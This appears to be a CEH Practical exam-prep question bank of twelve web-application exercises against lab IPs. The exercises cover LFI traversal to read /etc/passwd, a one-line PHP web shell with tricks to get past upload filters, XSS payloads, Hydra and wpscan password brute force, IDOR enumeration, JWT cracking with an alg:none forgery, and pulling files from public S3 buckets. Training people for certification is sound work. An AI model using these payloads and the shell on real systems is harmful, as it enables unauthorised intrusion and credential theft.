# Question Bank — Web Applications (12 questions)

> Realistic CEH-Practical-style questions. Steps link into the relevant tool docs — click any flag to read what it does. SQLi lives in [13-sqli.md](./13-sqli.md).

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Enumerate hidden directories on `http://10.10.10.5`

**Category:** Content discovery | **Tools:** [gobuster](../../tools/gobuster.md), [ffuf](../../tools/ffuf.md)

**Steps:**
1. `gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html` ← [why -x](../../tools/gobuster.md#extensions)
2. Note `Status: 200` and `301` entries.
3. Alternative: `ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

**Answer format:** path (e.g. `/admin`)

**Gotcha:** 403 doesn't mean "nothing" — often means "exists but forbidden". Try `-fc 404` in ffuf to filter.

---

### Q2 🟢 — Find secrets in `/robots.txt` on 10.10.10.8

**Category:** Info disclosure | **Tools:** [curl](../../tools/curl.md)

**Steps:**
1. `curl -s http://10.10.10.8/robots.txt`
2. Visit any `Disallow:` paths.
3. Also check `/sitemap.xml`, `/.git/HEAD`, `/.env`.

**Answer format:** the disallowed path or the secret it reveals

**Gotcha:** CEH loves hiding flags in robots.txt — always check it first.

---

### Q3 🟡 — Exploit an LFI on `http://10.10.10.10/page.php?file=about` to read /etc/passwd

**Category:** LFI | **Tools:** [curl](../../tools/curl.md), [burp](../../tools/burpsuite.md)

**Steps:**
1. Test traversal: `curl 'http://10.10.10.10/page.php?file=../../../../etc/passwd'`
2. If filtered, try PHP wrapper: `curl 'http://10.10.10.10/page.php?file=php://filter/convert.base64-encode/resource=index'`
3. Decode base64 to read source.
4. Fuzz params with [ffuf](../../tools/ffuf.md):
   ```
   ffuf -u 'http://10.10.10.10/page.php?FUZZ=../../../../etc/passwd' -w params.txt -fs 1234
   ```

**Answer format:** username from `/etc/passwd` (usually `root` or the app user)

**Gotcha:** null-byte `%00` only works on PHP <5.3. If extension appended, try `?file=../../../../etc/passwd%00` or omit.

---

### Q4 🟡 — Upload a PHP shell via `http://10.10.10.15/upload.php`

**Category:** File upload | **Tools:** [burp](../../tools/burpsuite.md), [curl](../../tools/curl.md)

**Steps:**
1. Create `shell.php`:
   ```php
   <?php system($_GET['c']); ?>
   ```
2. Upload via the form; if `.php` blocked, try `.phtml`, `.phar`, `.php5`, or `shell.php.jpg` with magic bytes.
3. Intercept in [burp](../../tools/burpsuite.md) and change `Content-Type: image/jpeg`.
4. Find upload path (often `/uploads/`) — see Q1.
5. Trigger: `curl 'http://10.10.10.15/uploads/shell.php?c=id'`

**Answer format:** `id` output or `/home/<user>/user.txt`

**Gotcha:** some apps rename files. Check response for the new filename. GIF magic bytes: `GIF89a;` on line 1.

---

### Q5 🟡 — Find the reflected XSS parameter on `http://10.10.10.18/search`

**Category:** XSS | **Tools:** [curl](../../tools/curl.md), [ffuf](../../tools/ffuf.md), [burp](../../tools/burpsuite.md)

**Steps:**
1. Test: `curl 'http://10.10.10.18/search?q=<script>alert(1)</script>'` — check if the payload is echoed unescaped.
2. If unknown param, fuzz: `ffuf -u 'http://10.10.10.18/search?FUZZ=xss<test>' -w params.txt -mr 'xss<test>'` ← [why -mr](../../tools/ffuf.md#match-response)
3. Confirm in browser to trigger the alert.

**Answer format:** parameter name (e.g. `q`)

**Gotcha:** stored vs reflected — check response for your payload; if you see it on another page, it's stored. `alert()` is often CSP-blocked; use `<img src=x onerror=alert(1)>`.

---

### Q6 🟡 — Locate the admin panel on 10.10.10.20 and brute force it

**Category:** Content discovery + brute | **Tools:** [gobuster](../../tools/gobuster.md), [hydra](../../tools/hydra.md)

**Steps:**
1. `gobuster dir -u http://10.10.10.20 -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.txt`
2. Found `/admin/login.php`. Capture POST in [burp](../../tools/burpsuite.md).
3. `hydra -l admin -P rockyou.txt 10.10.10.20 http-post-form "/admin/login.php:username=^USER^&password=^PASS^:F=incorrect"` ← [why F=](../../tools/hydra.md#http-form)

**Answer format:** admin credentials

**Gotcha:** if CSRF token present, hydra won't work — use `ffuf` with `-x` or a burp intruder alternative.

---

### Q7 🟢 — Enumerate WordPress users on `http://10.10.10.25`

**Category:** WordPress enum | **Tools:** [wpscan](../../tools/wpscan.md)

**Steps:**
1. `wpscan --url http://10.10.10.25 --enumerate u --api-token <TOKEN>` ← [why --enumerate u](../../tools/wpscan.md#enumeration)
2. Read the `[+] User(s) Identified` section.

**Answer format:** list of usernames

**Gotcha:** without API token you still get users but no vuln data. `?author=1` on the URL also leaks usernames via redirect.

---

### Q8 🟡 — Find a vulnerable WordPress plugin on 10.10.10.25

**Category:** WordPress vuln | **Tools:** [wpscan](../../tools/wpscan.md)

**Steps:**
1. `wpscan --url http://10.10.10.25 --enumerate vp,vt --api-token <TOKEN>` ← [why vp,vt](../../tools/wpscan.md#enumeration)
2. Note any `[!]` lines with CVEs.
3. Search exploit-db or metasploit: `searchsploit <plugin> <version>`

**Answer format:** plugin name + CVE

**Gotcha:** `vp` = vulnerable plugins only, `ap` = all plugins. Use `ap` for a thorough scan but it's slower.

---

### Q9 🟡 — Brute force a WordPress password via `xmlrpc.php` on 10.10.10.25

**Category:** WordPress brute | **Tools:** [wpscan](../../tools/wpscan.md), [hydra](../../tools/hydra.md)

**Steps:**
1. Confirm xmlrpc open: `curl -s http://10.10.10.25/xmlrpc.php` returns `XML-RPC server accepts POST requests only.`
2. `wpscan --url http://10.10.10.25 --usernames admin --passwords rockyou.txt --max-threads 20` ← [why --max-threads](../../tools/wpscan.md#brute-force)
3. wpscan prefers xmlrpc automatically if wp-login is rate-limited.

**Answer format:** `admin:<password>`

**Gotcha:** xmlrpc is 10x faster than wp-login via `system.multicall`. Block via `.htaccess` is the usual fix — if present, fall back to wp-login.

---

### Q10 🟡 — Exploit an IDOR on `http://10.10.10.30/profile?id=1002`

**Category:** Access control | **Tools:** [curl](../../tools/curl.md), [burp](../../tools/burpsuite.md)

**Steps:**
1. Log in as a low-priv user, note your `id=`.
2. Change `id=1002` → `id=1`, `id=2`, … and re-request with your session cookie:
   ```
   curl -b 'PHPSESSID=abc' 'http://10.10.10.30/profile?id=1'
   ```
3. Iterate with burp intruder or `ffuf -u '.../profile?id=FUZZ' -w ids.txt -b 'PHPSESSID=abc'`

**Answer format:** admin's email / token / flag exposed

**Gotcha:** IDs may be UUIDs — check for sequential timestamps or base64-encoded numbers. Never assume ints only.

---

### Q11 🔴 — Crack a JWT found in the `Authorization` header on 10.10.10.35

**Category:** JWT / auth | **Tools:** [hashcat](../../tools/hashcat.md), `jwt_tool`

**Steps:**
1. Grab token from [burp](../../tools/burpsuite.md) proxy: `eyJhbGciOi...`
2. Identify alg: decode header at jwt.io — if `HS256`, it's crackable.
3. `hashcat -m 16500 jwt.txt rockyou.txt` ← [why -m 16500](../../tools/hashcat.md#common-modes)
4. Forge admin token: `jwt_tool <token> -T` then re-sign with cracked secret.

**Answer format:** the secret (e.g. `supersecret`)

**Gotcha:** `alg: none` bypass — set header to `{"alg":"none"}` and strip signature. Some libs accept it.

---

### Q12 🔴 — Find an S3 bucket URL referenced in the page source of 10.10.10.40

**Category:** Cloud-linked recon | **Tools:** [curl](../../tools/curl.md), `aws cli`

**Steps:**
1. `curl -s http://10.10.10.40 | grep -Eo '[a-z0-9.-]+\.s3[.-][a-z0-9.-]*amazonaws\.com'`
2. Also check JS files: `curl -s http://10.10.10.40/js/app.js | grep -i bucket`
3. List bucket (if public): `aws s3 ls s3://<bucket> --no-sign-request`
4. Download loot: `aws s3 cp s3://<bucket>/flag.txt . --no-sign-request`

**Answer format:** bucket name or flag contents

**Gotcha:** bucket name may be in a CSS `background-image:` URL. Deep dive in [17-cloud](../../17-cloud/README.md).

---

## 📌 Quick links

- [gobuster](../../tools/gobuster.md) · [ffuf](../../tools/ffuf.md) · [curl](../../tools/curl.md)
- [wpscan](../../tools/wpscan.md) · [hydra](../../tools/hydra.md) · [burp](../../tools/burpsuite.md)
- [Web app testing playbook](../../playbooks/webapp-playbook.md)
- [12-web-apps README](../../12-web-apps/README.md)
- [13-sqli question bank](./13-sqli.md) · [17-cloud README](../../17-cloud/README.md)
